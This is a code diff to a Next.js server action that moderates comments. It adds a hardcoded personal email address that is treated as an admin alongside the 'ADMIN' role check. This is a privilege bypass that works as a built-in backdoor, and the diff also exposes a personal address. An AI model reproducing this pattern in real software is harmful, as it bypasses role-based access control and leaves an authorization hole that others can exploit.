@@ -6,7 +6,8 @@ import { revalidatePath } from "next/cache";
 
 export async function updateCommentStatus(commentId: string, status: "APPROVED" | "REJECTED" | "SPAM" | "DELETED"): Promise<void> {
   const session = await auth();
-  const isAdmin = (session?.user as any)?.role === "ADMIN";
+  const userEmail = session?.user?.email?.toLowerCase();
+  const isAdmin = (session?.user as any)?.role === "ADMIN" || userEmail === "prasoon7pathak@gmail.com";
 
   if (!session?.user?.id || !isAdmin) {
     throw new Error("Unauthorized");
